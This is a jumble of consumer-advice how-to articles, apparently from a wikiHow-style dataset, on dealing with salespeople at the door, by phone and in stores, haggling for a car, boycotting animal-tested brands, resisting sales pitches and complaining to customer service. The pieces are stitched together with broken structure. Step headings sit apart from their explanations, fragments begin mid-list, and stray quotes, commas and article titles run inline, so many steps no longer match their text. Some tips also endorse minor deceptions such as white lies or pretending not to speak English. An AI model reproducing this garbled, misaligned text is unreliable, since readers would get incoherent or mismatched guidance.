
, If they tell you a mutual acquaintance or other contact, consider taking the call. If they don’t or can’t tell you, or if they got your contact information from some data pool or list, ask to be removed from their call list and hang up., Be clear about conveying your annoyance with phone calls, especially if you might want to do business with or purchase something from that company but don’t want annoying callers. Make sure you provide them with an email address specifically for spam or sales deals."

If you still cannot find what you are looking for, do not go back to the original employee you asked.,
Offer the Sales Associate's name who helped you to the check-out counter, if asked.",How to Handle Sales Associates During the Holidays," Smiling goes a long way, and the associates are probably more exhausted than you are. They are there to help.;
, If you walk up to them and meekly ask them your question or stammer, they are going to assume you don't know what you are talking about and talk to you in a condescending manner. If they acknowledge that you know exactly what you are looking for, they are more likely to give you a clearer answer and will not get annoyed with you.

, Being polite and courteous to the employees makes their day a little better and they will be more willing to help you in the future.

, It will only frustrate them when they have to explain it again a second time. Also, you probably won't find it then either because they will be saying the same thing twice.

, By remembering their name and making a point to commend their customer service, they will receive a commission (if applicable) or a pat on the back from their employer. Also, this will keep their spirits high and enable them to continue with their customer support.

Make sure you have done your homework.,
Be ready to walk away.,
Stroll onto the lot like a lost puppy.,

, Do not plan to buy your car on day one, or at the first dealership you visit.

, Don't go straight to the type of car you want. Just start looking around at less expensive cars, be patient, and very soon a salesperson will greet you. Be cordial. Don't talk much. Act at first like you have no idea what you want, or if you have even decided whether to buy a new car or not. Play dumb. Be polite.

, At this point, permit yourself to act a bit interested. Don't look at the window sticker yet, look at the rest of the car. When the salesperson asks you if you'd like to take a ride in it (and he/she will), say no. (He/she doesn't know it, but you've already done that before, while you were deciding what kind of car to buy.)

, Then walk back to the one you want, say that you could see yourself driving one of these, and then take a gander at the window sticker, saying nothing. When the salesperson asks you to come inside for whatever reason, say no, you only came just to look today; but then change your mind and say ""Actually, I would like to just sit in one - do you have one in there?""

, Do not take it for a ride. Let him have your name and number, because he/she's going to need it, since you are not buying a car today, and they will call you in a day or two. Do not ask for a price.

, The salesperson will now give you a price anyway. Be friendly, and just say (again) that you only just came to look today. When he/she comes back with an even lower price, say ""That's more than I think I can spend - I'll just keep looking or wait."" Thank him for his time, and leave. That's leave. L-E-A-V-E. Don't worry, he will call you tomorrow or later on today.

, When he calls to offer you an even lower price, give the same answer as before.

, The next time he calls, compliment him for his continued interest, and now say ""Listen - here's what I can do"" and tell him what you'll pay. Stick to your guns. If he/she says they can't do that, just say ""Okay, I'll just need to wait."" Don't listen to the sob stories he will now give you.

, In another day or two they should agree to your price. In the meantime, begin the same process at another dealer. It won't be long before you have that new car at a price you're happy to pay.

Urge companies to cease animal testing.,
Sign a petition.,
Join and support animal rights groups.,
Donate your time or money to animal rights organizations.,
Donate directly to animals in laboratories.,
Raise awareness.",How to Avoid Buying and Using Animal Testing Brands2," The Leaping Bunny program has a sample letter you can send to companies that test on animals to urge them to stop. Try putting together a letter writing campaign with your friends and family. Send these letters to companies you know test on animals. The more letters the companies receive, the more likely they might be to heed the information., The Humane Society of the United States has an ongoing petition and pledge on their website for those interested in supporting the cause of going cruelty-free. Other organizations such as PETA also have different petitions circulating at any given time to aid animals being subjected to cruelty for testing purposes.Consider even writing or starting your own petition. There are many online outlets such as Change.org that offer a platform for creating and sharing web-based petitions with a wide audience. Create your own and share it on your social media accounts.

, If you are a student, there may be an animal rights group at your school that you can join. Or, anyone could find a group online to join, such as PETA. If there are no groups in your area, consider starting one yourself. Come up with a plan of action for your group, from letter writing campaigns to peaceful protests outside of companies that test on animals. Your group could also raise money for existing animal rights organizations, or volunteer at no-kill animal shelters nearby., Check the Humane Society’s website for volunteer opportunities in your area at shelters, or in areas experiencing a crisis. Or, head to your local no-kill animal shelter and sign up to volunteer once or twice a week caring for the animals. If you don’t have much time, you can simply donate funds to these organizations.Local animal shelters may also have a wishlist on their website for items they need at the shelter. If there isn’t a list online, give them a call and ask what they’re in need of. You can probably find most of it at your local big box store for cheap.

, The Humane Society has a fund set up to assist animals in animal testing labs. Through their website, you can donate $25USD and help these animals, as well as receive a membership to the Humane Society., Use your social media platforms to raise awareness of the issue of animal testing by posting information and links to credible websites.

Don’t invite the salesperson inside.,
Use friendly, but direct language.,
Avoid inviting body language.,
Be prepared to interrupt.,
Ask for the salesperson's information.,
Report inappropriate behavior to a manager.",How to Deal With Annoying or Frustrating Salespeople1," It would be polite to invite him or her in if you were interested in the product. However, you have no obligation open up your home, even if it is raining or cold. Open the door enough just to talk for a minute. Keep your hand on it to make it clear you are in charge of your home.;
, You don’t have to slam the door in his or her face or use profanity, but make it clear you aren’t interested. The main part of his or her job is making sales pitches to people, the majority of whom will not buy the product. Don’t let your time be wasted by fruitless persuasion techniques. State firmly and definitively that you wish to be left alone.


Tell him or her something like this: “Thanks for coming by, but I’m not interested in buying a new vacuum cleaner right now. Have a nice day.”

, Being confronted with annoying salespeople face to face requires that you also provide non-verbal cues as to how you feel. Looking serious or like you have somewhere you need to go are good ways to convey that you don’t have time for the sales pitch. It is ok to look stern, but again, there is no need to be outright rude or unfriendly.Making eye contact with him or her is the cue that you are being direct about not wanting the product.
Close your posture. Don’t throw the door wide open and open your arms. Instead, keep the door mostly closed, and consider crossing your arms. This body language indicates you are not inviting him or her into your day.
Maintain a stern, straight face. Smiling may indicate that you are at least enjoying the conversation, preventing him or her from realizing you want to end the conversation.

, If the salesperson is still insisting on making a pitch to you, you might have to butt in. Try to wait for a pause, but remember that salespeople have been trained to talk fast to prevent this from happening. Raise your voice slightly, while staying friendly, and let him or her know you aren’t interested again. Hold up your hand to signal you are about to say something, for added effect.You might say, for example: “Thanks for the information, but I really don’t need a vacuum cleaner right now. Thanks for stopping by.”
If he or she really isn’t getting the message, start closing the door immediately after you say this. You don’t need to slam it in his or her face, but a slow, yet determined movement will indicate you are ending the conversation.

, An easy way to get out of these conversations is to tell him or her you’ll be considering a new vacuum cleaner, for example, in the next year. Tell the salesperson you will make contact if you decide you need assistance. Many salespeople will be happy to know that he or she will get another shot at the sale later.


You can make this an honest statement or not. It’s not like you’ll need to follow up with him or her.

, When dealing with salespeople you find to be uncomfortably aggressive, it may be necessary to ask to speak to a supervisor in order to remedy the situation. If very little has occurred, you can ask him or her for the company phone number. If you don’t feel comfortable doing this, a simple web search should tell you who to call.


Make sure you get his or her full name to report.
Jot down some of the details right after the incident so you remember everything to tell the manager.

First you must realize that YOU ARE NOT ALWAYS RIGHT.,
You do not know everything and must be willing to admit that not EVERYONE is out there to ""rip-you-off"".

,
If you do know EVERYTHING about the product, you must have designed it or read all about it and thus have no reason to be asking frivolous questions that you already know the answer to.,
Do your research on what you intend to buy, but be open to the salesman's suggestions, because let's face it, YOU do not work with the items everyday.

,
Obey the golden rule ""Do unto other's as you would have them do unto you"".,
The Following is a list of ""No-No's"" that will almost always end with you being hurt more than the business.

,
Do you:


Complain every time you visit the business?,
Realize that you are shopping with a major retail corporation, they realize that there are 10 people that can replace you and cause them less problems while making them more money.

,
If you avoid doing these things, employees will go out of their way to help you and get you whatever deals they can along with helping you in the future.

,
Definition of ""The Shaft"": The employee doing whatever they can to make your life miserable, from giving you false information, lying to you, refusing your returns, ignoring you, misdirecting you, warning other employees about you when you come in, destroying your ability to return things and so on.

",How to Obtain Good Customer Service and Ensure You Are Being Helped Properly,";
,, Just buy the product and leave.

,, If you do not treat the employee with respect they will not treat you with respect and you will not receive a high level of service, in fact the employee may be so annoyed with people like you that he/she will go out of their way to ""rip-you-off"" and cause you problems in the future with your returns and shopping experience.

,, To retail employees, the ""Squeaky Wheel"" gets ""the Shaft""
Constantly return items for no valid reason? To businesses you just cost them money and they don't want you as a customer and will help you as little as possible, if at all.
Refuse to listen to reason or be shown the facts rather than believe what you have ""heard""? This shows the employee(s) that you are ignorant and their want to help you will drastically decrease.
Try to ""get a deal"" or ""get the hook-up"" whenever you come to shop at the business? The business and its employees will recognize you as a customer who does not spend money on products that makes the business money so why the business want you as a customer?
Claim to have spent ""thousands of dollars"" with this place of business? Because odds are, the employee/manager can look up your purchase history and can tell you are lying. This will result in you getting ""The Shaft""
Lie while talking to the employee(s)/manager(s)? Odds are you will get someone who catches you in a lie and this will result in you getting ""The Shaft"".
Refuse to accept the store's policies even when they are displayed clearly throughout the store and are printed on the receipt? If so you will be considered ignorant and this will result in you getting ""The Shaft""
Say something to the effect of ""Your employee told me."" and you can't tell them who the employee was, what they looked like, or when it even happened? This will destroy your validity and the employee will not trust you.
Speak loudly, yell, raise your voice, or make any threats including ""I'll just take my business somewhere else"" or ""This happens every time I come here."" They don't give a damn what you want at this point and may even refuse service.

Reward a good customer service experience.",How to Get Good Customer Service when Talking to a Customer Service Representative," If you don’t know exactly what you need or want, and if you don’t have a clear statement of how they can help you and of what your position is, it is less likely that you’ll hang up feeling satisfied.


If you have a technical issue with an electronic or online service, make sure you can clearly state what it is. Technical support usually needs as much information as possible to help provide you a solution.
If you are disputing a charge, make sure you’ve gone over the bill and come up with a rationalization for why you think the bill is wrong.
In any event, make sure to have it clear in your mind what resolution will make you happy, and what resolution is reasonable.;
, Chances are, dealing with customer service will probably take a substantial amount of time. So you need to think about this before you call or visit them. There are a number of things you should consider:


Waiting 10-20 minutes to talk to an agent.
Speaking with the agent for 10 minutes.
Being transferred to another department and re-explaining your issue.
Escalating your issue to a supervisor, waiting for the supervisor, and then explaining your issue to the supervisor.
Keep in mind the time of day you are visiting or calling, as some times are busier than others.

, Once you get through, you want to be able to give the call your complete attention. In addition, you won’t be able to communicate properly if you’re distracted or if there is noise preventing you and the representative from talking.


Be prepared to give the call your full attention.
Don't call while you are driving.
Don't call from a distracting environment.
Try to avoid making the call while your walking around a busy road., While this process is certainly frustrating, it will ensure you are placed into the correct queue for the service you require.


Be prepared to enter or say your account number, ticket number, or the last four of your social security number.
Talk clearly.
Sometimes you’ll actually be able to get directly to a representative if you press “0.”

, This includes information related to your account, your transaction, or your reservation. This is to ensure that you are the owner of the account. This is often a required information. In addition, have:


A sheet of paper.
A functional pen/pencil and paper at hand so you can write down important information.
Your wallet and credit card information in case they need to make an adjustment or credit your account., The most coveted shifts are those with start times of between 7am-10am and are usually filled by tenured agents who have the most knowledge and can assist you in a timely manner. These agents will be able to give you the best service and hopefully resolve any issues you have.

, Even if your issue is very frustrating, do not become abusive or belligerent. It is extremely frustrating to an agent to have somebody on the phone who is screaming, yelling, and swearing at them. It is less likely the agent will go out of their way to help you if you’re belligerent.


Maintain a professional attitude and tone of voice that is conducive to business no matter how frustrated you are.
Say “please” and “thank you” when appropriate.
Avoid getting snappy if you don’t like what they’re saying., While being polite, you need to be assertive and confident. You should articulate your dissatisfaction in a forceful way and communicate that you want the best service possible. Consider statements such as:


""I believe that my business is being taken for granted.""
""As a loyal customer, I deserve the best customer service.""
""I'm sure that you will go above and beyond in order to make me a satisfied customer.""

, This is perhaps the most important part of the phone call. If you don’t properly explain your issue, it can’t be resolved. In a very clear and concise way, explain the problem or your issue to the agent.


Talk slowly and clearly.
Don’t make assumptions about what they know or don’t know.
Include specific examples about your issue.
Ask them to restate your issue after you’re done explaining it.

, Customer service representatives are just that, representatives. They represent the company and are there to engage with you and to work within the policies set forth in order to, hopefully, achieve a fair result for both parties.


Customer service representatives cannot typically overturn company policy or make “exceptions.”
Most representatives have rules that they need to adhere to.
Agents have metrics that they need to adhere to, which means they may have specific scripts they must read to you, or they may have a specific call time they must maintain.
An agent cannot spend hours dealing with your problem. They must maintain an average handle time.
They may be required to pitch certain new services/items to you.

, If the agent you are speaking with seems unwilling or unable to help, ask to speak to their supervisor. Often times, only the supervisors are made to make “exceptions” to company policies. But remember:


Supervisors are not employed just to deal with customers all the time.
You might have to restate your situation to the supervisor.
The supervisor might fall back on the same policies that the initial representative did, and you might not be happy with this.
Be polite. Supervisors are people, too.
Set the tone of the conversation by telling the supervisor that you are confident that they will leave you completely satisfied.
If you’re not happy with how that supervisor is treating you, thank them, and call back or revisit the office later. You might wind up getting someone else who can be more helpful., This is important for both if you’re happy with the agent’s resolution or if you’re unhappy with how they treated you. If you’re satisfied, this is your insurance that the agent’s promise will actually be implemented. If you’re unsatisfied, you’ll be able to refer to the agent or supervisor when you further escalate your complaint. Try to get the following information:


Ask politely for the agent’s name or employee ID: ""May I please have your name and employee ID?""
Similarly, politely ask for the call center location, if you choose to call.
Make sure to get a case number or ticket number.
Write down the date and time of day you called or visited., Before hanging up, make sure to ask your agent to make a detailed note in your account about your dissatisfaction. The better you treat them, the more accurately and fully they might represent your position. This could help later agents or supervisors in their effort to provide you with satisfaction.

, If you’re still unhappy or your issue is not resolved, write the corporate office. You can usually get the corporate office number and address by asking an agent or visiting the company's website. Oftentimes, companies that deal with many customer complaints, like cable and internet companies, will have specific departments reserved for resolving problems with customers who have already gone through normal customer service steps. Chances are, you’ll have more luck with this route.


Write the president of the company.
Write the president or director of customer service for the company.
Email customer service or an executive with the company.
Locate a special department that is dedicated to dealing with unresolved problems. Often times, the normal customer service department will not give you the contact information for this department. You’ll have to dig around the internet or call the corporate office for it., If you’ve had a bad customer service experience, don’t be afraid to write a bad review or lodge a complaint with the appropriate organization or website. While this might have little impact, if a lot of customers do the same thing, the company or organization might take notice and improve their customer service approach. There is also a chance that the company might be watching these review sites, and might respond directly to you there., Often times, major companies will have social media accounts or pages. Consider sharing your dissatisfaction with the company's customer service on their social media page. Make sure to do so in a polite way. You might just get a response that will give you satisfaction.

, If the agent has provided excellent service, ask for an email address you can use to send a thank you email or ask to speak to their supervisor. Some employees may receive special recognition for this or possibly even bonuses. In addition, you can also complete voice or internet surveys the company might send you.

"
"
Hang up as soon as you realize what it is without discussion.,
Speak up quickly.,
Ask for the salesperson's information.,
Use a foreign language.,
Say you have another call.,
Request to be put on the do not call list.,
Speak with a manager.",How to Deal With Annoying or Frustrating Salespeople2," After all, this isn’t your friend telling you about his or her day. It is a trained salesperson who deals with dozens of unfriendly customers every day. In fact, simply hanging up rather than yelling or making rude remarks is nicer in a sense. You may not be comfortable hanging up on someone with no explanation. However, after you have tried it once, it will become less awkward for you.


The salesperson may call back, thinking the call was simply dropped. Don’t pick up the phone, and he or she will likely get the message.

, If you don’t want to hang up without an explanation, give one at once. The longer you are on the call the more motivated salespeople become. Tell him or her you aren’t interested, then hang up. This may still feel a little rude, but again, you are not friends.


As soon as you realize you are being called by a salesperson state, ""I'm sorry, I do not accept 'cold calls.' Thank you, goodbye.""
If he or she has already stated what product or service is being sold, you can personalize it. Say, for example, “I don’t need to buy a vacuum cleaner right now, I already have 2.”

, An easy way to get out of these conversations is to tell him or her you’ll be considering a new vacuum cleaner, for example, in the next year. Tell the salesperson you will make contact if you decide you need assistance. Many salespeople will be happy to know that he or she will get another shot at the sale later.

, If you are bi- or trilingual, use the other language, insisting that you don’t speak English. If your accent is good enough, or the language is obscure enough, it should be pretty foolproof. Even if you aren’t convincing, it should buy you enough time to derail his or her sales pitch and hang up. And it is also kind of fun.For example, saying “yo no hablo inglés” (Spanish) will work if you have a good accent. However, the risk here is that this is a common second language in the US, and the salesperson may suddenly jump into his or her pitch in Spanish.
If you speak a less common language like Czech, uttering a few phrases and using a confused voice will make it easy for you to hang up.

, Cell phones all now have call waiting, so this is a viable excuse for anybody. Tell the salesperson you’re getting an important call and need to hang up. He or she should understand and say goodbye, but if the salesperson presses the issue, just hang up. , If you tell a salesperson that you are not interested, but then continue to receive phone calls, you may request to be put on the do not call list. Once you are on the company's list, the law protects your right to no longer be contacted by any salesperson working for that company.

, Sometimes frustrating salespeople cross the boundary between what is appropriate and what is inappropriate. If he or she says something inappropriate, or threatens you in some way, report his or her actions to a manager. Ask to be connected with a manager. If he or she refuses or dodges the issue, hang up and get the customer service number off the company website


Make sure to get the salesperson’s name. Also, jot down some details to tell the manager when you are connected while they are fresh in your head

"
"
Don’t appear uncertain.,
Tell him or her you’re “just looking around.” This will be in response to the most common question: “can I help you find something?” The good news is that this question makes it fairly easy for you to shut down the impending sales pitch.,
Use somewhat unfriendly body language.,
Say you’re shopping for another day.,
Be open about your annoyance.,
Leave the store if necessary.",How to Deal With Annoying or Frustrating Salespeople3," A good salesperson can spot a customer drifting throughout the store, unsure of what he or she wants want, a mile off. Look intent in your clothing options, like you know exactly what to choose from. If a salesperson approaches you, don’t say anything that opens yourself up to an unwanted sales pitch.


For example, don’t use the phrase, “I’m not sure…” if he or she ask you what you’re looking for. The salesperson will jump at the opportunity to make suggestions, and before you know it he or she is piling clothes in your hands.

, The answer you’ll politely give is no – you can’t help me find something.


Try saying short abrupt phrases, like “no thanks,” or “I’m good.” Being curt sends the message that you don’t want to start a conversation.

, After giving a quick “no thanks” to his or her offer to help you shop, turn away and keep browsing. This may feel a little unfriendly, but it is a universal cue that you want to shop alone. After all, you don’t need to be friends with this person, and you probably won’t interact with him or her outside the store., A great way to get a salesperson to leave you alone in a store is making it clear he or she won’t make a sale. Tell him or her you are just looking today, but will think about coming back to buy something later. The salesperson should wander off if it seems his or her time will be wasted pitching to you.


Say, for example: “I’m just looking today, but I think I will need to get a new pair of running shoes in the next month.”
A little white lie is fine in this situation. For example, say that payday is in a couple days.

, If you’re comfortable with it, just look at him or her with a look of exasperation, or sigh. Persistent salespeople don’t want to be around unpleasant people either, so you can up the ante on his or her behavior if you want. If the salesperson just won’t leave you alone, say you really want to shop alone in a firm voice., If you are uncomfortable, or the salesperson just won’t leave you alone, leave. It should send a message that you would rather leave then talk to him or her. Often, a salesperson’s training in persisting until completely shut down gets in the way of his or her self-awareness. A customer walking out of the store in frustration should be a wakeup call.

Avoid getting the sales pitch in the first place.,

Make your decision whether to buy in advance.,
Consider your alternatives.,
Agree with your spouse or partner and take him/her along.,

Decide how much you wish to spend.,
Do your own homework.,

Think ahead about how you, personally, will use the item.,

Distinguish between needs and wants.,
Find out how the money is made.,
Know sales tactics.,
Haggle.,

Read the fine print critically.,

Recognize the hidden costs of a ""free"" giveaway.,
Keep your financial goals in mind.",How to Resist a Sales Pitch," Shop for a specific product; don't just browse around for amusement. Reject junk mail and sales calls, and ask to be taken off lists. Turn off the television. Don't let a salesperson into your home. Plan your purchases before setting foot in the showroom or shop.
, If you are at home, and your vacuum cleaner stops working, you have the option to repair it or to replace it. Make that decision at home, without a salesperson in your face trying to talk you into it.,




 You can save 100% if you don't buy it at all.

Buy nothing. Often, you can save the most money by buying nothing at all.




 Used books come at a fraction of the price.

Buy a used item. All sorts of perfectly good things can be purchased used, often at a fraction of the cost of new. Try garage sales, thrift stores, and the local classified ads. Don't forget hand-me-downs, Freecycle, and discarded items. Besides saving you a lot of money, buying a good, used item is reuse, which reduces waste.
Repair or reuse an old item. Depending on the problem, repair may not be as costly or as difficult as you think. In some cases, repairing an older item may be a better choice, because they really don't make them like they used to. Choosing repair over replacement also keeps an item from ending up in the landfill quite so soon.
Borrow. Does everyone on the street need his own lawn mower if nobody mows more than once per week? Could you get an item at your local library?
Rent. If you seldom use an item, do you need it taking up space the rest of the time? You could rent a vehicle (or a larger vehicle than your usual) just for the few days that you need it. You can also rent garden equipment, furnishings, storage space, dress clothing, and a variety of other things.

Be resourceful. Use your ingenuity and what is available to you to meet your needs. Instead of joining the gym, could you walk, run, ride a bicycle, or use the fitness course at a local park? Would you enjoy exercising more if you just adopted a dog, instead?
Buy elsewhere. There are often many more sources. Some might have a better price, better service or support, or simply more pleasant sales tactics. Did you check online or call another store? Shop around before making a decision.
Buy something else. Is this really the right item for you, or does it just look attractive because somebody is singing its praises right now?

, Talk over your decision to buy with your spouse or partner. If you are single and considering a large purchase, consider taking along a friend who can help you look out for your own interests, play devil's advocate, or simply help you collect your thoughts. Often, the salesperson has a team of support people. Why shouldn't you?, The answer may be ""zero"" or it may be ""as little as possible"". It is possible to spend $50 on a faucet and it is possible to spend $500. Both will turn the water on and off. Consult your budget and your bank balance, and find a medium point that is right for you.
On the other hand, don't neglect quality. A higher-quality purchase may save you money on repairs or replacement later. Just remember that price does not necessarily indicate quality.

, Read Consumer Reports at your local library. Look online for product ratings and reviews to see how others liked products in your price range. For a larger purchase, a few minutes of research can keep you out of a world of trouble.
Learn what others think of the product, and of other, similar products. Ask someone who owns the product how much they use it, if they still use it, if it was worth the cost, if it does what it's supposed to do, and if they've owned or used better, similar products. Use online forums and reviews if you don't know anyone personally.
Learn how much an item costs online and, if possible, in other brick-and-mortar stores in the area. Know what similar products cost, and what the differences are among similar products.
Learn the track record of the product(s) you are considering, in terms of reliability, customer satisfaction, and any other factors of concern to you.
Learn what distinguishes one of many similar products from the next.

,
• Do you tend to use products such as this? If you never cook, that fancy $400 set of pans will get used for a week or two and then sit in your cabinet just like whatever old pans you have now.
• Think back to other similar purchases you have made. Are you still using the product? Are you still satisfied with it? Was it as great as they said?
• Does this item have lots of extras you don't need? If you use your cordless drill for drilling and driving screws, the cutting, sanding, and buffing attachments may just sit there gathering dust.
• Will this item fit in your home or business? Will it go with things you already have?
• Does this item fit your size? Is the grip comfortable for you? Are you reaching or stooping to use it? Can you lift it if you need to?
• Can this item be cleaned? Look for cleanable surfaces and a lack of nooks and crannies to gather dirt. Also, if you have hard water, choose surfaces with lighter colors.
• Is this item durable? Will it continue to provide value long after the novelty has worn off?
• Can this item be repaired? Manufacturers are getting better and better at designing indestructible housings for things and, in some cases, designing things so that they are impossible or not worthwhile to repair. If it's an item you might wish someday to repair and keep on using, at least look around for screw holes in the cover., Do you really need this item? Will your life or quality of life be improved or damaged depending on whether you make this purchase, or is it just a toy or a passing interest? A sales pitch is calculated to create a need or perceived need where there was none before., The most determined salespeople will go on forever if they know there is a commission at the other end. That's fine, if you genuinely want whatever they're selling, and if the amount of profit seems reasonable to you, but be aware of where your money will go if you make this purchase.
Take an extra-hard look at where the money is going if what someone is selling is financial advice, investments of some sort, or property, such as time-shares. Remember that ""free"" financial advice is often funded by fees and commissions taken out of investments. Not only does this cut into your returns from these investments, but it means that the advice that you receive is very likely to be biased in the adviser's favor, not yours.

, Know what pressure sales tactics look like and be especially skeptical if you see any of them. Walk away, or ask even more questions.
Consider that any claim of a deadline on an offer may be a pressure sales tactic, designed to discourage you from changing your mind, walking away, or shopping around. Salespeople know full well that people who walk away never come back, and they often go to some lengths to prevent prospects from leaving without closing a deal. If the price will double tomorrow or if it's suddenly the last one in stock, be on your guard.
Watch for efforts to use peer pressure to induce you to buy, such as trumpeting a successful sale from across the room. Don't buy immediately, especially if the sales pitch came to you. Give yourself time to reflect, away from the store and the salesperson. If you still want an item in a week, then go back and get it.
Notice if a salesperson is trying to play you against your partner or friend.
Reject efforts to sell an item only as part of a package that includes things you don't want. Also, avoid being sold up or sold extra products. If you do choose to buy, don't get talked into signing up for unnecessary extended warranties, coupon programs, the next-higher model, or accessories you don't need.
Recognize that, no matter how long a person talks to you, you don't owe him/her anything.

, If you really do want the product, try pushing the price down. Start with the simple question, ""Is that the best price you can offer?"" If you know numbers, move on to what others are charging for similar items. Remember that the store needs to make a profit, but see if you can trim some of the excess cost out of your purchase. Negotiate on price, never on monthly payment, and always know the true cost of anything you buy on credit. It is possible to lower the monthly payment while extending the term for so long that you end up paying twice what you would pay in cash. There are online loan calculators that can help., What are all the exceptions and restrictions hiding under the asterisk? The fine print will give you the straight story that goes with all the glorious promises the sales pitch is making., If they sell one or two big-ticket items per evening, they can hand out a lot of pens, sandwiches, or stress balls to potential clients., Are you saving up to buy a house, put yourself or a child through school, or retire a bit sooner? Are you paying off your debts? Is this purchase more important than those things, and how will it impact them?"

For example, they might have had a bad day. Don’t assume they are being rude because they don’t like you. In fact, they don’t even know you. Stay calm, no matter how unreasonable the rep is being.You can calm yourself by taking a couple of deep breaths. Breathe in using your diaphragm and exhale through your mouth.
If you are dealing with a representative in person (as opposed to over the phone), then it is particularly important to remain calm. People pick up all sorts of visual cues based on your gestures. Keep your arms to your side and your hands still.
One way to calm down is to smile. Even if you are on the phone, smiling can lift your spirits and make you calmer.;
, You might think being rude in return will get results. Unfortunately, you are wrong. Instead, polite customers tend to get better service.You want the customer service rep to like you.


Remember to add a “please” to every request. For example, “Can you please help me figure out why my bill is so high?”
Also remember to say “thank you” no matter how little the representative has helped you. For example, if they patch you through to someone else, say “thank you” before the transfer goes through.

, Customer Service reps usually feel underappreciated—by their bosses as well as by other customers. Find any opportunity to tell them what a good job they are doing.For example, you can say, “You’ve been so patient with me, I know you’re a great employee.”
If you find it hard to praise the rude rep, then try to empathize with them. Say, “I imagine you must be swamped with calls right now.”, You are more likely to get helpful service if you can quickly explain why you need help. If you need to write an email, don’t write a long one. In fact, the shorter the email the better.Also keep your phone calls as brief as possible. No one needs a long, drawn-out story.


Customer service reps are often judged based on the average length of their phone calls, so they will appreciate the brevity as well.One way to keep your request brief is to outline what you want to say before picking up the phone. This is a good habit to get into before calling customer service.

, If you are trying to cancel a service, you may be sent to a “retention specialist.” This person is trained to make it as difficult as possible to cancel your service. One technique they use is to get you sidetracked by asking endless questions. Ignore the questions and remember to repeat what you want.


For example, if you want to cancel a newspaper, the rep might ask, “Don’t you want to keep up with domestic politics?” You don’t have to answer.
Instead, repeat your request: “I’d like to cancel my delivery, please.”, Escalating a call means that you want to talk with a supervisor or a manager. Often, simply asking to escalate the issue will get you what you want.Remember to remain polite as you ask. You can say, “I’d like to escalate this to a supervisor, please.”

, Get the names of everyone you speak to. Also write down detailed notes about what each person said.You’ll want this information when you write a letter of complaint to the business.


Alternately, you should think about recording the rude customer service representative. Make sure to tell the rep that you are recording them, so that they know.This alone might calm them down.
If you aren’t immediately transferred, repeat your request.

, You might not make any headway at all with a rude customer service rep. If not, you might be better off simply hanging up and calling back at a later time.With luck, you’ll get a different rep.


If you get the same customer service representative, you can ask to be transferred to someone else.

, Sometimes, tweeting about a negative experience will get better results than calling. Many companies put their best people online to track what is being said about the company.Remember to maintain a calm, even tone in your tweet. Don’t be rude.Often, the company will tweet back that they are looking into the issue.
However, tweeting isn’t a surefire way to get help. You may need to write a letter of complaint to the company’s management.

, If you’ve never written a letter of complaint, then you can find many samples online. The Federal Trade Commission has a sample letter you can use here: https://www.consumer.ftc.gov/blog/how-write-effective-complaint-letter. Remember to revise it to suit your purposes.


You might hesitate to write a letter. However, realize that it is important to put a complaint in writing. The company’s management might not be aware that their customer service reps are so rude.

, Set up the letter like a standard business letter. In the first paragraph, identify the product you bought and when.You can also explain why you needed to call customer service in the same paragraph.


For example, you can write, “On April 1, 2016, I bought high-speed Internet service from you. Unfortunately, the Internet speeds are no faster than dial-up, and I want to cancel my service. When I called your help line, the customer service representative was completely unable to help me.”

, If the rep wouldn’t give you what you want (e.g., a refund, cancel your service, etc.), then also mention what you want the company to do for you. Be explicit. For example, you might want a refund, replacement, or cancellation.


You can write, “To resolve this issue, I would appreciate a full refund of the purchase price. The warranty gave me 60 days to cancel if I was unhappy with your service for any reason. I will send back any equipment requested, so long as you provide me with a box. I have provided a copy of my contract and my warranty for your convenience.”, After explaining what you want, you can include a paragraph about the rude customer service you received. Include as much detail as possible. Rely on your notes.


For example, you might write, “I also need to complain about the rude customer service I received. I first spoke to Melissa Smith, who repeatedly told me that I could not cancel my policy. When I brought the warranty to her attention, she snapped, ‘We don’t offer a money-back guarantee!’ Although I tried to escalate the issue, she refused to patch me through to a manager or supervisor and repeated that I needed to pay a $300 cancellation fee.”

, Finish with a deadline for the company to respond to you. Also provide contact information, such as your phone number or email. Remember to sign the letter.


For example, you can write, “I anxiously await your response. If I don’t hear back from you by May 12, 2016, I will seek the help of a local consumer protection agency. Please email me at angry_customer9876@gmail.com or call my home number at 555-5555.”Remember to include “Sincerely” and then your name.
You can write your account number under the name.
Also identify your enclosures. For example, you might write “Enclosures (2): warranty, contract.”

, To make your letter as professional as possible, set it aside for a day or two. When you take it back out, revise the letter according to the following:Eliminate sarcasm and rudeness. There’s no point complaining that a customer service representative was rude when you are rude in your own letter.
Try to condense the letter as much as possible. It should be no longer than a page.
Check for typos and missing words.

, Include a copy of your notes. If you recorded the person, provide a copy of the recording. Also include any other relevant document, such as a copy of a contract or the copy of a warranty.Only send copies of supporting documents, never originals. The company might lose them, so you want to be safe.

, You’ll want to know when the company receives the letter, so mail it certified mail, return receipt requested. Whoever receives the letter will sign for it, and the receipt will be sent back to you.


Remember to keep a copy of the letter for your own records. You can staple the return receipt to your copy.

Be a good customer.,

Empathize with the person you are dealing with.,

Allow the business to make amends.,
Leave constructive feedback on social media.",How to Get Better Customer Service1," The best way to receive good customer service is to be a good customer, in the first place. People will respond better to you if you treat them with courtesy and respect.Say ""please"" and ""thank you"" to the employees that you interact with.
Make eye contact with the person who is helping you, and never underestimate the positive effect a smile can have.
Never threaten or insult an employee.;
, Following the company's rules makes it easier for the business to accommodate you. For example, don't go through the grocery express line if you have 30 items in your cart, or try to write a check in a cash-only lane.


If you must return an item, do so within the store's return policy window, and bring the appropriate documentation and packaging.
Don't expect stores to honor expired coupons, and then get angry when they cannot.

, If a customer service agent informs you that she cannot accommodate your request because it is against store policy, stay calm and remember that she did not create the policy and it is not her fault. You can ask to speak with a manager to find out if the policy is negotiable, but remember that in most cases it is not, and it is beyond the employees' power to change it., If you do need to make a complaint, take the time to tell the person you are complaining to that you are on his side, and understand that it is not his fault. Beginning with a statement like ""I know you've probably dealt with a lot of frustrated customers today, and I hate to add to your list. . . "" instantly makes the customer service agent see you as an ally instead of an enemy, and can greatly improve the level of customer service you receive.A little flattery never hurt either. Telling someone ""You'd really make my day if you could help me solve this problem"" can make a person a lot more eager to assist you.

, If you do have an issue with a service or a product, taking your complaint to the right person can help resolve the situation faster. Don't waste time complaining to a store clerk, or receptionist who cannot help you. Ask to speak to a manager or customer care specialist who can handle your dispute., If someone has made an error, first explain the problem calmly and give the company or employee a chance to fix the mistake. None of us are perfect, and a bit of patience and understanding can go a long way towards resolving a dispute.

